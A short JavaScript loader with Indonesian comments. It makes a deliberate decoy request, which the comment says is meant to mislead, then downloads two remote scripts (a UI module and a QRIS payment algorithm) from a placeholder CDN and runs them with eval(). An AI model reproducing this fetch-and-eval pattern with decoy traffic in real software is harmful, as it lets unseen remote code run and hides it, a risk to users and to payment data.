
(async function() {
  try {
    // JS Pancingan (kosong untuk mengecoh)
    fetch("https://yourcdn.com/dummy-lib.js").catch(()=>{});

    // Load UI (2.js)
    const ui = await fetch("https://yourcdn.com/2.js").then(r => r.text());
    eval(ui);

    // Load QRIS Algorithm (3.js)
    const qris = await fetch("https://yourcdn.com/3.js").then(r => r.text());
    eval(qris);

    console.log("✅ Modul UI & QRIS berhasil dimuat");
  } catch (e) {
    console.error("❌ Gagal memuat modul:", e);
  }
})();
